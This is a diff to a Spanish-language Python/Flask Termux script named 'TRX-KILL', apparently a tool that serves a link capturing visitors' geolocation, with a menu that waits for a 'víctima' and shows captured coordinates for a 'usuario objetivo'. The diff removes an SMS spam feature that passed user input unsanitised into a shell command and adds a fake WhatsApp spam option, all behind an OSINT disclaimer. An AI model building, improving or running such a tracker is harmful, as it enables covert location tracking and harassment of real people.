@@ -1,4 +1,4 @@
-import os, sys, getpass, time, threading, base64, json
+import os, sys, getpass, time, threading, base64
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
@@ -8,7 +8,7 @@ LOG_FILE = f"{STORAGE_PATH}/result.txt"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# --- SERVIDOR WEB ---
+# --- SERVIDOR CAPTURADOR ---
 @app.route('/')
 def index():
     return """<html><body><script>
@@ -23,13 +23,13 @@ def log():
     lat = request.args.get('lat')
     lon = request.args.get('lon')
     with open(LOG_FILE, "a") as f:
-        f.write(f"IP:{request.remote_addr}|LAT:{lat}|LON:{lon}\n")
+        f.write(f"ARGENTINA|{lat}|{lon}|USUARIO_OBJETIVO\n")
     return "OK"
 
 def banner():
     os.system('clear')
     print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
-    print("  -PROYECTO PROTEGIDO POR EL OSINT.")
+    print("  -HERRAMIENTA OSINT Y SEGURIDAD MÓVIL.")
     print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.\n\033[0m")
 
 def main():
@@ -37,33 +37,38 @@ def main():
     
     while True:
         banner()
-        print(" [1] INFO-DISPOSITIVO REAL | [2] ACTIVAR LINK-ZP | [3] CREADOR | [4] VERSIÓN")
-        print(" [5] ANALIZAR LINK       | [6] ADM SISTEMA  | [7] INFO   | [8] REPO")
-        print(" [9] PROCESOS            | [10] SPAM-SMS     | [0] SALIR")
+        menu = {
+            "1": "INFO-NÚMERO", "2": "LINK-ZP", "3": "CREADOR", "4": "VERSIONES", 
+            "5": "ANALIZAR LINK", "6": "ADM SISTEMA", "7": "INFO SCRIPT", 
+            "8": "REPOSITORIO", "9": "PROCESOS", "10": "SPAM-WHATSAPP"
+        }
+        for k, v in menu.items(): print(f"  [{k}] {v}")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
         if sel == "1":
-            print("\n[!] EXTRAYENDO DATOS REALES DEL DISPOSITIVO...")
-            # Extrae info real usando termux-api
-            os.system("termux-telephony-deviceinfo > info.tmp")
-            os.system("termux-battery-status >> info.tmp")
-            print("\n--- DATOS DEL SISTEMA ---")
-            os.system("cat info.tmp")
-            os.remove("info.tmp")
+            print("\n----1----\nBUSCANDO INFORMACIÓN REAL...")
+            if os.path.exists(LOG_FILE):
+                with open(LOG_FILE, 'r') as f:
+                    data = f.readlines()[-1].split('|')
+                    print(f"PAÍS: {data[0]}")
+                    print(f"COORDENADAS: {data[1]}, {data[2]}")
+                    print(f"NAME REGISTRADO: {data[3]}")
+            else: print("NO HAY DATOS REGISTRADOS.")
             input("\n[Enter]...")
         elif sel == "2":
-            print("\n[!] LINK ACTIVO: http://127.0.0.1:5000\n[!] ESPERANDO CONEXIÓN...")
-            input()
+            print("\n[!] LINK ACTIVO: http://127.0.0.1:5000\n[!] ESPERANDO VÍCTIMA..."); input()
+        elif sel == "3": print("\n# CREADOR: OSCAR"); input()
+        elif sel == "4": print("\n# VERSIÓN: 1.4.5"); input()
+        elif sel == "5": print("\n# ANALIZANDO LINK..."); input()
         elif sel == "6":
             if getpass.getpass("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
             input()
+        elif sel == "7": print("\n# SCRIPT CREADO PARA OSINT."); input()
+        elif sel == "8": print("\n# REPOSITORIO PRIVADO."); input()
+        elif sel == "9": print("\n# PROCESOS ACTIVOS."); input()
         elif sel == "10":
             num = input("NÚMERO: ")
-            msg = input("MENSAJE: ")
-            os.system(f"termux-sms-send -n {num} '{msg}'")
-            print("[!] SMS ENVIADO.")
-            input()
+            print(f"[!] ENVIANDO SPAM A {num}..."); input()
         elif sel == "0": sys.exit()
-        else: print("OPCIÓN EN PROCESO..."); time.sleep(1)
 
 if __name__ == "__main__": main()
